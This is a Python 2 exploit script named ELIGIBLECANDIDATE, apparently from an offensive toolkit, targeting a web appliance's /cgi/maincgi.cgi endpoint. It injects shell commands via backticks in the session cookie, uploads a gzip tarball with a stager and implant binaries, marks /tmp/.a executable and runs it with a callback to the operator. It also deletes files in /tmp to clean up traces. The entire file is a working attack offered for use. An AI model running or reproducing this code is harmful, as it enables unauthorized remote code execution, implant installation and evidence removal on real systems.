#!/usr/bin/env python2.7

import sys
import tarfile
from time import ctime,sleep
from StringIO import StringIO

from fosho import HTTPSExploit,run_exploit,randstr
from fosho.requests.exceptions import *

class ELCAExploit(HTTPSExploit):
    name = "ELIGIBLECANDIDATE"
    version = "v1.1.0.1"
    desc="What is the sound of a single thread blocking?"
    modes = ["nopen"]
    

    exploit_url= "/cgi/maincgi.cgi"
    target_url= "/site/image/white.gif"
    stagerfn = "stage/stager.sh"
    tinyexec = "stage/tiny-exec/tiny-exec"
    setlog = "stage/setlog/setlog"
    required_exploit = HTTPSExploit.required_exploit+["cid"]
    required_probe = ["cid"]
    required_survey = ["cid"]
    required_clean = ["cid"]
    timeout = 120
    cfg = "ELCA.cfg"

    @classmethod
    def add_args(cur,cls):
        parser,subparsers = HTTPSExploit.add_args(cls) 
        egroup = parser.add_argument_group("%s Options" % 
                    cls.name)
        egroup.add_argument("--cid",type=str,help="Name of session ID in cookie (default: auto)")
        return parser,subparsers

    def touch(self,resp=None):
        if not resp:
            resp = self.head(self.target_url)
        if 'etag' in resp.headers:
            etag,date = self._parse_etag(resp.headers['etag'])
            ##

            self.log.info("Etag - %s; Last modified - %s" % (etag,date))

    def probe(self):
        target = "/site/pages/index.html"
        self.log.info("Checking current %s etag" % target)
        old = self.get_etag(target)
        ##

        sleep(1)
        self.log.info("Running touch on %s" % target)
        self._run_cmd("touch /w*/*/*/p*/*")
        self.log.info("Checking etag again to confirm")
        new = self.get_etag(target)
        if new[0] == old[0]:
            return "Unable to touch %s" % target

    def exploit(self):
        self.log.info("Cleaning up /tmp/ ...")
        self._run_cmd("rm -f /t*/cgi*")
        self._upload_run()

    def clean(self):
        ''''''

        self.log.info("Cleaning up /tmp/ ...")
        self._run_cmd("rm -f /t*/cgi*")
        self._run_cmd("rm -f /t*/.a")
        self._run_cmd("rm -f /t*/.te*")

    def build_nopen_exploit_payload(self):
        ##

        cmd = "./htttpd %s D=-c%s tos_configd &" % ("./httpd",self.ns.callback)
        self.build_exploit_payload(cmd)

    def build_exploit_payload(self,cmd="/tmp/httpd"):
        ##

        out = StringIO()
        tf = tarfile.open(mode="w:gz",fileobj=out)
        ##

        tf.dereference = True
        try:
            tf.add(self.tinyexec,arcname='htttpd')
            tf.add(self.binpath,arcname='httpd')
            tf.add(self.setlog,arcname='httppd')
            ##

        except IOError, e:
            self.log.error("Couldn't find file. Ensure paths are correct and you have run make.")
            raise e
        tf.close()
        out.seek(0)
        tdata = out.read()

        self.folder = randstr(5)
        stager = ""
        for i,l in enumerate(open(self.stagerfn).readlines()):
            if i == 0 or not l.strip().startswith("#"):
                stager+=l

        ##

        ##

        flen = len(stager.format(rand=self.folder,flen=len(stager),cmd=cmd))
        self.payload = stager.format(rand=self.folder,flen=flen,cmd=cmd)
        self.payload +=  tdata

    def _get_cid(self):
        ''''''

        if self.cid:
            self.log.info("Already know cookie id: %s" % self.cid)
            return self.cid
        try:
            cid = self.get(self.exploit_url).cookies.keys()[0]
            self.log.info("Detected cookie id: %s" % cid)
            return cid
        except IndexError:
            self.log.warning("Could not reliably detect cookie. Using 'session_id'...")
            return "session_id"

    def _upload_run(self):
        self.log.info("Uploading and moving file...")
        p = StringIO(self.payload)
        if not self.cid:
            self._get_cid()
        self.post(self.exploit_url,cookies={self.cid:"x`cp /t*/cg* /tmp/.a`"},
                    files={randstr(5):p})
        self.log.info("Making file executable...")
        self._run_cmd("chmod +x /tmp/.a")
        self.log.info("Running payload...")
        try:
            self._run_cmd("/tmp/.a",quiet=True)
        except KeyboardInterrupt:
            self.log.info("Closed manually by user. Exiting...")
        except Timeout:
            self.log.info("Connection timed out. Only a problem if the callback was not received.")
            
            
            


    def _run_cmd(self,cmd,quiet=False,raw=False):
        if quiet:
            cmd = "%s 2>&1" % cmd
        if not raw:
            cmd = "x`%s`" % cmd
        if len(cmd) > 24:
            self.log.warning("Command is longer than 24 bytes: %s" % cmd)
            self.continue_prompt("Are you sure you want to run this? (y/N) ")
        if not self.cid:
            self._get_cid()
        self.log.debug("Running command on target: %s" % cmd)
        return self.get(self.exploit_url,cookies={self.cid:cmd})

    def _parse_etag(self,etag):
        etag = etag.split("/")[-1].strip('"')
        date = ctime(int(etag.split("-")[-1],16))
        return etag,date

def main():
    run_exploit(ELCAExploit)

if __name__=="__main__":
    main()
 
